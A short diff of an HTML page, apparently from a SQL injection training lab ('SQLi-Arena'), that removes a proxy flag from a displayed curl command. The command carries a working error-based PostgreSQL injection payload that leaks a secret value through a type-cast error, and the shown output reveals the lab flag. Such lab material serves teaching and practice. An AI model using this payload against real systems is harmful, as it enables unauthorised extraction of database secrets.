@@ -125,7 +125,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab8" \<br> --data-urlencode "username=' || (SELECT CAST(secret_value AS INTEGER) FROM secret_data LIMIT 1) || '" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab8" \<br> --data-urlencode "username=' || (SELECT CAST(secret_value AS INTEGER) FROM secret_data LIMIT 1) || '" \<br>
         &nbsp;&nbsp;--data-urlencode "message=test"<br><br>
         <span class="prompt">Output:</span><br>
         <strong>PostgreSQL Error:</strong> ERROR: invalid input syntax for type integer: "FLAG{pg_f1l3_wr1t3_c0py}"
